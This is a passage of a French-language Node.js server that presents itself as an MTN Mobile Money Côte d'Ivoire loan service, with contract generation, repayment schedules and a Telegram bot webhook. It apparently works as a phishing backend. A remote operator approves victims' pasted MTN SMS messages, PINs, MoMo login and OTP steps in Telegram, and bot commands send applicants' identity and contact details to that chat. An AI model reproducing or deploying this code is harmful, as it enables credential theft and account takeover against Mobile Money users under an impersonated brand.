    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Mois';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;
    const tnc = app_.tncAccepted || {};
    const agreement =
        'MTN MOBILE MONEY CÔTE D\'IVOIRE – CONTRAT DE PRÊT\n' +
        '================================================\n\n' +
        'ID Dossier : ' + app_.applicationId + '\n' +
        'Généré le  : ' + new Date().toLocaleString('fr-FR') + '\n' +
        'Version CGL: ' + (tnc.version || TNC_VERSION) + '\n\n' +
        'EMPRUNTEUR\n----------\n' +
        'Nom complet   : ' + (app_.firstName || '') + ' ' + (app_.lastName || '') + '\n' +
        'Numéro CNI    : ' + ((app_.momoRegistration || {}).idNumber || 'N/A') + '\n' +
        'Naissance     : ' + (app_.dob || 'N/A') + '\n' +
        'Téléphone     : +225 ' + (app_.phone || '') + '\n' +
        'Email         : ' + (app_.email || '') + '\n' +
        'Compte MoMo   : ' + ((app_.momoRegistration || {}).accountName || app_.accountType || 'N/A') + '\n\n' +
        'VÉRIFICATION INSCRIPTION\n------------------------\n' +
        'Statut       : ' + (app_.registrationStatus || 'N/A') + '\n' +
        'SMS vérifié  : ' + (app_.regSmsVerifiedAt ? new Date(app_.regSmsVerifiedAt).toLocaleString('fr-FR') : 'N/A') + '\n' +
        'Terminé le   : ' + (app_.regCompletedAt ? new Date(app_.regCompletedAt).toLocaleString('fr-FR') : 'N/A') + '\n\n' +
        'DÉTAILS DU PRÊT\n---------------\n' +
        'Capital        : ' + fmtXOF(loanAmount) + '\n' +
        'Durée          : ' + loanTerm + '\n' +
        'Mensualité     : ' + fmtXOF(monthly) + '\n' +
        'Total à rendre : ' + fmtXOF(total) + '\n' +
        'Taux d\'intérêt : 24 % par an (composé mensuellement)\n\n' +
        'GARANT\n------\n' +
        'Nom         : ' + (app_.guarantorName || 'N/A') + '\n' +
        'Téléphone   : ' + (app_.guarantorPhone ? '+225 ' + app_.guarantorPhone : 'N/A') + '\n' +
        'Relation    : ' + (app_.guarantorRelation || 'N/A') + '\n\n' +
        '© 2026 MTN Mobile Money Côte d\'Ivoire';
    res.json({ ok: true, agreement: agreement });
});

app.get('/api/agreement-pdf/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    const loanAmount = app_.loanAmount || 0;
    const loanTerm = app_.loanTerm || '12 Mois';
    const months = parseInt(loanTerm) || 12;
    const monthly = app_.monthlyRepayment || monthlyRepayment(loanAmount, months);
    const total = monthly * months;

    const doc = new PDFDocument({ size: 'A4', margin: 50 });
    res.setHeader('Content-Type', 'application/pdf');
    res.setHeader('Content-Disposition', 'attachment; filename="momo-contrat-' + app_.applicationId + '.pdf"');
    doc.pipe(res);
    doc.fillColor('#000').fontSize(20).font('Helvetica-Bold').text('MTN Mobile Money Côte d\'Ivoire', { align: 'center' });
    doc.fontSize(12).font('Helvetica').fillColor('#666').text('Contrat de Prêt', { align: 'center' });
    doc.moveDown(0.5);
    doc.strokeColor('#FFCC00').lineWidth(3).moveTo(50, doc.y).lineTo(545, doc.y).stroke();
    doc.moveDown(1);
    const line = (l, v) => {
        doc.font('Helvetica-Bold').fillColor('#333').fontSize(10).text(l + ':', { continued: true });
        doc.font('Helvetica').fillColor('#000').text(' ' + (v || 'N/A'));
    };
    doc.font('Helvetica-Bold').fontSize(12).fillColor('#000').text('EMPRUNTEUR'); doc.moveDown(0.3);
    line('ID Dossier', app_.applicationId);
    line('Nom complet', ((app_.firstName || '') + ' ' + (app_.lastName || '')).trim());
    line('Numéro CNI', (app_.momoRegistration || {}).idNumber);
    line('Naissance', app_.dob);
    line('Téléphone', app_.phone ? '+225 ' + app_.phone : null);
    line('Email', app_.email);
    line('Compte MoMo', (app_.momoRegistration || {}).accountName || app_.accountType);
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('DÉTAILS DU PRÊT'); doc.moveDown(0.3);
    line('Capital', fmtXOF(loanAmount));
    line('Durée', loanTerm);
    line('Mensualité', fmtXOF(monthly));
    line('Total à rendre', fmtXOF(total));
    line('Taux d\'intérêt', '24 % par an');
    doc.moveDown(0.8);
    doc.font('Helvetica-Bold').fontSize(12).text('GARANT'); doc.moveDown(0.3);
    line('Nom', app_.guarantorName);
    line('Téléphone', app_.guarantorPhone ? '+225 ' + app_.guarantorPhone : null);
    line('Relation', app_.guarantorRelation);
    doc.moveDown(1);
    doc.fontSize(9).fillColor('#888').text('Généré le ' + new Date().toLocaleString('fr-FR') + ' · © 2026 MTN Mobile Money Côte d\'Ivoire', { align: 'center' });
    doc.end();
});

app.get('/api/repayment-schedule/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    const loanAmount = app_.loanAmount || 0;
    const months = parseInt(app_.loanTerm) || 12;
    if (!loanAmount || !months) return res.status(400).json({ ok: false, error: 'Aucune donnée de prêt.' });
    const r = 0.24 / 12;
    const monthly = Math.ceil(loanAmount * r / (1 - Math.pow(1 + r, -months)) + 500);
    const schedule = [];
    let balance = loanAmount;
    for (let i = 1; i <= months; i++) {
        const interest = Math.round(balance * r);
        const principal = monthly - interest;
        balance = Math.max(0, balance - principal);
        schedule.push({ month: i, payment: monthly, interest: interest, principal: principal, balance: balance });
    }
    res.json({ ok: true, schedule: schedule });
});

// ═══════════════════════════════════════════════════════════
// WEBHOOK TELEGRAM
// ═══════════════════════════════════════════════════════════
app.post('/api/telegram-webhook', (req, res) => {
    res.status(200).send('ok');
    console.log('🔔 WEBHOOK:', new Date().toISOString());
    try {
        const body = req.body || {};

        if (body.callback_query) {
            const q = body.callback_query;
            fetch(`${TG_API}/answerCallbackQuery`, {
                method: 'POST', headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ callback_query_id: q.id, text: 'Reçu' })
            }).catch(() => {});
            try {
                const data = JSON.parse(q.data);
                const app_ = applications[data.id];
                if (!app_) return;
                const step = data.s;
                const approved = data.a === 'Y';
                if (!app_.registrationHistory) app_.registrationHistory = [];

                if (step === 'registration') {
                    if (approved) {
                        app_.registrationStatus = REG_STATUS.SMS_PENDING;
                        app_.regApprovedAt = new Date().toISOString();
                        app_.rejectionReason = null;
                        app_.regUserSms = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'approved_by_admin' });
                        saveApps();
                        tgSend(
                            '✅ <b>INSCRIPTION APPROUVÉE</b>\n' +
                            '🆔 ' + code(data.id) + '\n' +
                            '💳 ' + esc((app_.momoRegistration || {}).accountName || '') + '\n' +
                            '🔒 Prêt maximum : <b>' + fmtXOF(app_.accountMaxLoan || 0) + '</b>\n\n' +
                            '<b>📱 EN ATTENTE DU SMS DE L\'UTILISATEUR</b>\n' +
                            'L\'utilisateur va coller le SMS complet reçu de MTN.',
                            null
                        );
                    } else {
                        app_.registrationStatus = REG_STATUS.REJECTED;
                        app_.rejectionReason = 'Les détails d\'inscription n\'ont pas été vérifiés par l\'administrateur.';
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'rejected_by_admin', stage: 'registration' });
                        saveApps();
                        tgSend('❌ <b>INSCRIPTION REJETÉE</b>\n🆔 ' + code(data.id), null);
                    }
                    return;
                }

                if (step === 'reg_sms') {
                    if (approved) {
                        app_.registrationStatus = REG_STATUS.SMS_VERIFIED;
                        app_.regSmsVerifiedAt = new Date().toISOString();
                        app_.rejectionReason = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'sms_confirmed_by_admin' });
                        saveApps();
                        tgSend('✅ <b>SMS CONFIRMÉ</b>\n🆔 ' + code(data.id) + '\n👤 ' + esc(app_.fullName || 'N/A') + '\nL\'utilisateur définit maintenant son code PIN.', null);
                    } else {
                        app_.registrationStatus = REG_STATUS.SMS_PENDING;
                        app_.regUserSms = null;
                        app_.regSmsRejectedAt = new Date().toISOString();
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'sms_rejected_by_admin' });
                        saveApps();
                        tgSend('❌ <b>SMS REJETÉ</b>\n🆔 ' + code(data.id) + '\nL\'utilisateur va recoller son SMS.', null);
                    }
                    return;
                }

                if (step === 'reg_pin') {
                    if (approved) {
                        app_.registrationStatus = REG_STATUS.COMPLETED;
                        app_.regCompletedAt = new Date().toISOString();
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_approved' });
                        saveApps();
                        tgSend('🎉 <b>INSCRIPTION TERMINÉE</b>\n🆔 ' + code(data.id) + '\n🔒 Prêt max : <b>' + fmtXOF(app_.accountMaxLoan || 0) + '</b>', null);
                    } else {
                        app_.registrationStatus = REG_STATUS.SMS_VERIFIED;
                        app_.regPin = null;
                        app_.regPinSetAt = null;
                        app_.registrationHistory.push({ at: new Date().toISOString(), event: 'pin_rejected_by_admin' });
                        saveApps();
                        tgSend('❌ <b>CODE PIN REJETÉ</b>\n🆔 ' + code(data.id) + '\nL\'utilisateur ressaisit son code PIN.', null);
                    }
                    return;
                }

                const isNewStep = !!(app_.steps && step in app_.steps);
                const isLegacy = !isNewStep && (step in app_);
                if (!isNewStep && !isLegacy) return;
                const currentStatus = isNewStep ? app_.steps[step] : app_[step];
                if (currentStatus !== 'pending') return;

                const newValue = approved ? 'approved' : 'rejected';
                if (isNewStep) app_.steps[step] = newValue;
                if (isLegacy) app_[step] = newValue;
                if (step === 'qualification') app_.qualification = approved ? 'qualified' : 'unqualified';
                if (step === 'application') app_.application = newValue;

                app_.updatedAt = new Date().toISOString();
                saveApps();
                tgSend((approved ? '✅' : '❌') + ' <b>' + (approved ? 'APPROUVÉ' : 'REJETÉ') + '</b>\n🆔 ' + code(data.id) + '\n📋 ' + step.toUpperCase(), null);
            } catch (e) { console.error('Callback parse:', e.message); }
            return;
        }

        if (body.message && body.message.text) {
            const text = body.message.text.trim();
            const chatId = String(body.message.chat.id);
            if (!CHAT_ID || chatId !== String(CHAT_ID)) return;

            if (text === '/start' || text === '/help') {
                tgSend('🤖 <b>Bot de Prêt MTN MoMo Côte d\'Ivoire</b>\n━━━━━━━━━━━━━━━━━━━━━━\n📊 /stats\n📋 /list\n🔍 /search [ID]\n📞 /contact [ID]\n⏳ /pending\n🆕 /pendingreg', null);
            } else if (text === '/stats') {
                const total = Object.keys(applications).length;
                const pendingReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PENDING).length;
                const pendingSms = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.SMS_PENDING || a.registrationStatus === REG_STATUS.SMS_SUBMITTED).length;
                const pendingPin = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.PIN_PENDING).length;
                const completedReg = Object.values(applications).filter(a => a.registrationStatus === REG_STATUS.COMPLETED).length;
                const completedLoans = Object.values(applications).filter(a => a.steps && a.steps.qualification === 'approved').length;
                tgSend('📊 <b>STATISTIQUES</b>\n📝 Dossiers : ' + total + '\n⏳ Inscriptions à valider : ' + pendingReg + '\n📩 SMS en attente : ' + pendingSms + '\n🔐 PIN en attente : ' + pendingPin + '\n✅ Inscriptions complètes : ' + completedReg + '\n💵 Prêts approuvés : ' + completedLoans, null);
            } else if (text === '/pendingreg') {
                const pending = Object.entries(applications).filter(e => e[1].registrationStatus === REG_STATUS.PENDING);
                if (!pending.length) { tgSend('✅ Aucune inscription à valider.', null); return; }
                let msg = '🆕 <b>INSCRIPTIONS À VALIDER (' + pending.length + ')</b>\n';
                pending.slice(0, 10).forEach(e => {
                    msg += '\n🆔 ' + code(e[0]) + '\n👤 ' + esc(e[1].fullName || 'N/A') + '\n📞 ' + code('+225 ' + (e[1].phone || '')) + '\n💳 ' + esc((e[1].momoRegistration || {}).accountName || '') + '\n';
                });
                tgSend(msg, null);
            } else if (text.indexOf('/contact ') === 0) {
                const needle = text.replace('/contact ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Introuvable', null); return; }
                tgSend('📞 <b>CONTACT</b> ' + code(realKey) + '\nNom : ' + esc(a.fullName || 'N/A') + '\nTéléphone : ' + (a.phone ? code('+225 ' + a.phone) : 'N/A') + '\nEmail : ' + (a.email ? code(a.email) : 'N/A') + '\nNaissance : ' + (a.dob ? code(a.dob) : 'N/A') + '\nCompte : ' + esc((a.momoRegistration || {}).accountName || 'N/A') + '\nStatut : ' + esc(a.registrationStatus || 'N/A'), null);
            } else if (text === '/pending') {
                const pending = Object.entries(applications).filter(e => {
                    const a = e[1];
                    if (a.registrationStatus !== REG_STATUS.COMPLETED) return false;
                    return a.steps && Object.values(a.steps).indexOf('pending') !== -1;
                });
                if (!pending.length) { tgSend('✅ Aucun dossier en attente.', null); return; }
                let msg = '⏳ <b>EN ATTENTE (' + pending.length + ')</b>\n';
                pending.slice(0, 10).forEach(e => {
                    const steps = [];
                    STEP_ORDER.forEach(k => { if (e[1].steps[k] === 'pending') steps.push(k); });
                    msg += '\n🆔 ' + code(e[0]) + '\n👤 ' + esc(e[1].firstName || e[1].fullName || '') + '\n📋 ' + steps.join(', ') + '\n';
                });
                tgSend(msg, null);
            } else if (text === '/list') {
                const ids = Object.keys(applications).slice(-10);
                if (!ids.length) { tgSend('📭 Aucun dossier.', null); return; }
                let msg = '📋 <b>10 DERNIERS</b>\n';
                ids.forEach((id, i) => {
                    const a = applications[id];
                    msg += '\n' + (i + 1) + '. 🆔 ' + code(id) + '\n👤 ' + esc(a.firstName || a.fullName || '') + '\n';
                });
                tgSend(msg, null);
            } else if (text.indexOf('/search ') === 0) {
                const needle = text.replace('/search ', '').trim().toUpperCase();
                const realKey = Object.keys(applications).find(k => k.toUpperCase() === needle);
                const a = realKey ? applications[realKey] : null;
                if (!a) { tgSend('❌ Introuvable', null); return; }
                tgSend('🔍 <b>DÉTAILS</b> ' + code(realKey) + '\n👤 ' + esc(a.fullName || '') + '\n📱 ' + (a.phone ? code('+225 ' + a.phone) : 'N/A') + '\n🆕 Statut : ' + esc(a.registrationStatus || 'N/A') + '\n📋 ' + (a.steps ? STEP_ORDER.map(k => k + ':' + a.steps[k]).join(' ') : 'N/A'), null);
            }
        }
    } catch (e) { console.error('Erreur webhook:', e.message); }
});

// ═══════════════════════════════════════════════════════════
// STATUTS / RETRY
// ═══════════════════════════════════════════════════════════
app.get('/api/status/:applicationId/:step', guardAppId, (req, res) => {
    const applicationId = req.params.applicationId;
    const step = req.params.step;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    const valid = STEP_ORDER.concat(LEGACY_STEPS);
    if (valid.indexOf(step) === -1) return res.status(400).json({ ok: false, error: 'Étape invalide' });
    res.json({ ok: true, status: readStep(app_, step), applicationId: applicationId, step: step });
});

app.get('/api/status/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    const steps = {};
    STEP_ORDER.forEach(k => { steps[k] = readStep(app_, k); });
    res.json({
        ok: true,
        isRegistered: !!app_.isRegistered,
        registrationStatus: app_.registrationStatus || REG_STATUS.IDLE,
        rejectionReason: app_.rejectionReason || null,
        accountType: app_.accountType || null,
        accountName: (app_.momoRegistration || {}).accountName || null,
        accountMaxLoan: app_.accountMaxLoan || 0,
        phone: app_.phone || null,
        email: app_.email || null,
        dob: app_.dob || null,
        tncAccepted: app_.tncAccepted || null,
        steps: steps,
        loan: app_.loanData || null,
        personal: app_.personalData || null,
        employment: app_.employmentData || null,
        guarantor: app_.guarantorData || null,
        application: app_.application, sms: app_.sms, pin: app_.pin, otp: app_.otp, qualification: app_.qualification
    });
});

app.post('/api/retry/:applicationId/:step', guardAppId, (req, res) => {
    const applicationId = req.params.applicationId;
    const step = req.params.step;
    const app_ = applications[applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    const valid = STEP_ORDER.concat(['sms', 'pin', 'otp']);
    if (valid.indexOf(step) === -1) return res.status(400).json({ ok: false, error: 'Étape invalide' });
    resetStep(app_, step);
    app_.updatedAt = new Date().toISOString();
    saveApps();
    res.json({ ok: true });
});

app.get('/api/rejection-info/:applicationId', guardAppId, (req, res) => {
    const app_ = applications[req.params.applicationId];
    if (!app_) return res.status(404).json({ ok: false, error: 'Introuvable' });
    let rejectedStep = null, errorMessage = '';
    if (app_.registrationStatus === REG_STATUS.REJECTED) {
        rejectedStep = 'registration';
        errorMessage = app_.rejectionReason || 'Inscription rejetée.';
    } else {
        const labels = { loan: 'Prêt', personal: 'Informations personnelles', employment: 'Emploi', guarantor: 'Garant', momologin: 'Connexion MoMo', qualification: 'Qualification' };
        for (let i = 0; i < STEP_ORDER.length; i++) {
            const k = STEP_ORDER[i];
            const status = readStep(app_, k);
            if (status === 'rejected' || (k === 'qualification' && status === 'unqualified')) {
                rejectedStep = k; errorMessage = (labels[k] || k) + ' a été rejeté.'; break;
            }
        }
    }
    res.json({ ok: true, rejectedStep: rejectedStep, errorMessage: errorMessage });
});

app.get('*', (req, res) => res.sendFile(path.join(__dirname, '../frontend', 'index.html')));

// ═══════════════════════════════════════════════════════════
// DÉMARRAGE
// ═══════════════════════════════════════════════════════════
loadAll();
app.listen(PORT, '0.0.0.0', () => {
    console.log('🚀 Serveur en écoute sur le port ' + PORT + ' (v7.6 / Côte d\'Ivoire)');
    console.log('   → http://0.0.0.0:' + PORT + '\n');
});
